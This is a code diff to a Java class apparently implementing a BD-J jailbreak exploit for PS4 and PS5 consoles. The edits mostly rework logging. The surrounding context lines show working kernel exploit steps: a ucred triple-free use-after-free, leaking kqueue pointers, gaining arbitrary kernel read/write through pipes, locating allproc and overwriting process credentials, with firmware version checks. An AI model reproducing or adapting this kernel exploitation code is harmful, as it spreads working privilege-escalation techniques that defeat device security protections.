@@ -278,14 +278,13 @@ public class Poops {
         
         getFirmware();
         
-        NativeInvoke.sendNotificationRequest("PLATFORM : " + PLATFORM + "\nFW_VERSION : " + FW_VERSION);
+        Status.info("Console: " + PLATFORM + " " + FW_VERSION);
         
         NID_PATH = "/" + getNidPath() + "/common_temp/bdj.fail";        
-        Status.println("NID_PATH : " + NID_PATH);
+        //Status.info("NID path resolved");
         
         if(rerunCheck(NID_PATH)) {
-            NativeInvoke.sendNotificationRequest("Restart your console to run exploit again");
-            Status.println("Restart your console to run exploit again");
+            Status.error("Restart your console to run exploit again");
             return false;
         }
         
@@ -293,8 +292,7 @@ public class Poops {
         if (PLATFORM.equals("PS4")) {
             
             if (compareVersions(FW_VERSION, "9.00") < 0 || compareVersions(FW_VERSION, "13.00") > 0) {
-                NativeInvoke.sendNotificationRequest("UNSUPPORTED FW_VERSION");
-                Status.println("UNSUPPORTED FW_VERSION");
+                Status.error("UNSUPPORTED FW_VERSION: " + FW_VERSION);
                 return false;
             }
 
@@ -310,8 +308,7 @@ public class Poops {
         } else if (PLATFORM.equals("PS5")) {
             
             if (compareVersions(FW_VERSION, "1.00") < 0 || compareVersions(FW_VERSION, "12.00") > 0) {
-                NativeInvoke.sendNotificationRequest("UNSUPPORTED FW_VERSION");
-                Status.println("UNSUPPORTED FW_VERSION");
+                Status.error("UNSUPPORTED FW_VERSION: " + FW_VERSION);
                 return false;
             }
             
@@ -730,7 +727,7 @@ public class Poops {
         // Note: Only dup works because it does not check f_hold.
         close(dup(uafSock));
         
-        // Status.println("Finding twins...");
+        Status.info("Searching for triplets...");
         
         // Find twins.
         if(!findTwins()) {
@@ -790,7 +787,7 @@ public class Poops {
         iovState.waitForFinished();
         read(iovSs0, tmp, Int8.SIZE);
         
-        Status.println("Triplets found : " + String.valueOf(triplets[0]) + ", " + String.valueOf(triplets[1]) + ", " + String.valueOf(triplets[2]));
+        Status.info("Twins and triplets found");
         
         return true;
     }
@@ -1096,13 +1093,13 @@ public class Poops {
             long in6p_outputopts = kapi.kread64(so_pcb + IN6P_OUTPUTOPTS_OFFSET);
             kapi.kwrite64(in6p_outputopts + IP6PO_RHI_RTHDR_OFFSET, 0); // ip6po_rhi_rthdr
         } else {
-            Status.println("Skipped wrong fp: " + Long.toHexString(fp) + " for fd: " + String.valueOf(fd));
+            // Status.println("Skipped wrong fp: " + Long.toHexString(fp) + " for fd: " + String.valueOf(fd));
         }
     }
 
     private static void removeUafFile() {
         long uafFile = fget(uafSock);
-        Status.println("uafFile: " + Long.toHexString(uafFile));
+        // Status.println("uafFile: " + Long.toHexString(uafFile));
 
         // Remove uaf sock.
         kapi.kwrite64(fdt_ofiles + uafSock * FILEDESCENT_SIZE, 0);
@@ -1118,7 +1115,7 @@ public class Poops {
             close(s);
 
             if (removed == 3) {
-                Status.println("Cleaned up uafFile after iterations: " + String.valueOf(i));
+                // Status.println("Cleaned up uafFile after iterations: " + String.valueOf(i));
                 break;
             }
         }
@@ -1142,7 +1139,7 @@ public class Poops {
 
         long kernel_base = kl_lock - PS4_KernelOffset.getOffset("KL_LOCK");
         
-        Status.println("Kernel base : " + Long.toHexString(kernel_base));
+        // Status.println("Kernel base : " + Long.toHexString(kernel_base));
 
         long p = curproc;
         long p_ucred = kapi.kread64(p + 0x40);
@@ -1289,9 +1286,16 @@ public class Poops {
         Buffer pathBuffer = new Buffer(0x255);
         Int64 lenPtr = new Int64((long) 0x255);
     
-        long ret = __sys_randomized_path(0, pathBuffer, lenPtr);
+        long ret = 0;
+        try {
+            ret = __sys_randomized_path(0, pathBuffer, lenPtr);
+        } catch (Throwable e) {
+            Status.error("__sys_randomized_path crash: " + e.getMessage());
+            return "unknown";
+        }
         if (ret == -1L) {
-            throw new RuntimeException("randomized_path failed: " + Long.toHexString(ret));
+            Status.error("randomized_path failed: " + Long.toHexString(ret));
+            return "unknown";
         }
     
         StringBuffer sb = new StringBuffer();
@@ -1325,28 +1329,27 @@ public class Poops {
     public static void main(String[] args) {
         Status.setNetworkLoggerEnabled(false);
         
-        NativeInvoke.sendNotificationRequest(VERSION_STRING);
+        Status.info(VERSION_STRING);
         
         if (!setup()) {
             Status.println("setup failed");
             return;
         }
         
+        Status.info("Triggering exploit...");
         if (!triggerUcredTripleFree()) {
-            Status.println("triggerUcredTripleFree failed");
+            Status.error("triggerUcredTripleFree failed");
             cleanup();
-            Status.println("Exploit failed - Reboot and try again");
-            NativeInvoke.sendNotificationRequest("Exploit failed - Reboot and try again");
+            Status.error("Exploit failed - Reboot and try again");
             return;
         }
-        Status.println("triggerUcredTripleFree finished");
+        // Status.println("triggerUcredTripleFree finished");
         
         // Leak pointers from kqueue.
         if (!leakKqueue()) {
-            Status.println("leakKqueue failed");
+            Status.error("leakKqueue failed");
             cleanup();
-            Status.println("Exploit failed - Reboot and try again");
-            NativeInvoke.sendNotificationRequest("Exploit failed - Reboot and try again");
+            Status.error("Exploit failed - Reboot and try again");
             return;
         }
         // Status.println("leakKqueue finished");
@@ -1377,7 +1380,7 @@ public class Poops {
         masterPipebuf.putLong(0x10, victimRpipeData); // buffer
         kwriteSlow(masterRpipeData, masterPipebuf);
         
-        Status.println("Arbitrary R/W achieved.");
+        // Status.println("Arbitrary R/W achieved.");
         
         // Increase reference counts for the pipes.
         fhold(fget(kapi.getMasterPipeFd().get(0)));
@@ -1395,6 +1398,7 @@ public class Poops {
         
         // Find allproc.
         allproc = findAllProc();
+        
         // Status.println("allproc: " + Long.toHexString(allproc));
         
         // Jailbreak.
@@ -1410,16 +1414,14 @@ public class Poops {
             
             cleanup();
             
-            Status.println("Jailbreak complete.");
-            NativeInvoke.sendNotificationRequest("Jailbreak complete");
+            Status.success("Jailbreak complete");
             
         } else if (PLATFORM.equals("PS5")) {
 
             if (!ps5_jailbreak()) {
-                Status.println("PS5 jailbreak failed");
+                Status.error("PS5 jailbreak failed");
                 cleanup();
-                Status.println("Exploit failed - Reboot and try again");
-                NativeInvoke.sendNotificationRequest("Exploit failed - Reboot and try again");
+                Status.error("Exploit failed - Reboot and try again");
                 return;
             }
             
@@ -1428,8 +1430,7 @@ public class Poops {
             kapi.setKdataBase(kdata_base);
             kapi.setKqFdp(kq_fdp);
             
-            Status.println("Jailbreak complete. Kernel addresses stored in KernelAPI.");
-            NativeInvoke.sendNotificationRequest("Jailbreak complete");
+            Status.success("Jailbreak complete");
             
         } else {
             cleanup();
